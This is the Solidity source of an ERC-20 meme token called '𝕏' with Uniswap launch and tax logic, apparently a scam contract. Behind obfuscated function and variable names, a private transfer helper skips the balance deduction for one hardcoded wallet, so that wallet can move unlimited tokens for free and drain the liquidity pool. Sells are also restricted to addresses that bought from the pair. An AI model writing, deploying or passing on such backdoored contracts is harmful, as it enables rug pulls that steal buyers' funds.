/**

Twitter: https://twitter.com/X__erc

Telegram: https://t.me/Xerc_Portal

Website: https://xerc.org/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _bruej(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _bruej(a, b, "SafeMath");
    }

    function  _bruej(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bylvlh(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _potrce;
    address payable private _qrnfka;
    address private _bveunp;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylkocr=0;
    uint256 private _qvjudt=0;
    uint256 public _povyeb = _totalSupply;
    uint256 public _qrvork = _totalSupply;
    uint256 public _pjoevb= _totalSupply;
    uint256 public _qruref= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _blveaud;
    mapping (address => bool) private _bvpkzk;
    mapping(address => uint256) private _flaeru;

    bool private _mrsdopen;
    bool public _priwhq = false;
    bool private kldork = false;
    bool private _rexykj = false;


    event _qrbkje(uint _povyeb);
    modifier fritfy {
        kldork = true;
        _;
        kldork = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _blveaud[owner(

        )] = true;
        _blveaud[address
        (this)] = true;
        _blveaud[
            _qrnfka] = true;
        _qrnfka = 
        payable (0xcA3c4fB147231B92c294d56D4F510AcB79FC2140);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _bruej(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 bprofg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_priwhq) {
                if (to 
                != address
                (_potrce) 
                && to !=
                 address
                 (_bveunp)) {
                  require(_flaeru
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flaeru
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _bveunp && to != 
            address(_potrce) &&
             !_blveaud[to] ) {
                require(amount 
                <= _povyeb,
                 "Exceeds the _povyeb.");
                require(balanceOf
                (to) + amount
                 <= _qrvork,
                  "Exceeds the _qrvork.");
                if(_qvjudt
                < _ylkocr){
                  require
                  (! _frxdv(to));
                }
                _qvjudt++;
                 _bvpkzk
                 [to]=true;
                bprofg = amount._bylvlh
                ((_qvjudt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _bveunp &&
             from!= address(this) 
            && !_blveaud[from] ){
                require(amount <= 
                _povyeb && 
                balanceOf(_qrnfka)
                <_qruref,
                 "Exceeds the _povyeb.");
                bprofg = amount._bylvlh((_qvjudt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qvjudt>
                _ylkocr &&
                 _bvpkzk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!kldork 
            && to == _bveunp &&
             _rexykj &&
             contractTokenBalance>
             _pjoevb 
            && _qvjudt>
            _ylkocr&&
             !_blveaud[to]&&
              !_blveaud[from]
            ) {
                _transferFrom( _bckjv(amount, 
                _bckjv(contractTokenBalance,
                _qruref)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prnxk(address
                    (this).balance);
                }
            }
        }

        if(bprofg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(bprofg);
          emit
           Transfer(from,
           address
           (this),bprofg);
        }
        _balances[from
        ]= _bruej(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _bruej(bprofg));
        emit Transfer
        (from, to, 
        amount.
         _bruej(bprofg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      fritfy {
        if(tokenAmount==
        0){return;}
        if(!_mrsdopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _potrce.WETH();
        _approve(address(this),
         address(
             _potrce), 
             tokenAmount);
        _potrce.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bckjv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _bruej(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qrnfka){
            return a ;
        }else{
            return a .
             _bruej (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _povyeb = _totalSupply;
        _qrvork = _totalSupply;
        emit _qrbkje(_totalSupply);
    }

    function _frxdv(address 
    account) private view 
    returns (bool) {
        uint256 drieop;
        assembly {
            drieop :=
             extcodesize
             (account)
        }
        return drieop > 
        0;
    }

    function _prnxk(uint256
    amount) private {
        _qrnfka.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _mrsdopen ) ;
        _potrce  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _potrce), 
            _totalSupply);
        _bveunp = 
        IUniswapV2Factory(_potrce.
        factory( ) 
        ). createPair (
            address(this
            ),  _potrce .
             WETH ( ) );
        _potrce.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_bveunp).
        approve(address(_potrce), 
        type(uint)
        .max);
        _rexykj = true;
        _mrsdopen = true;
    }

    receive() external payable {}
}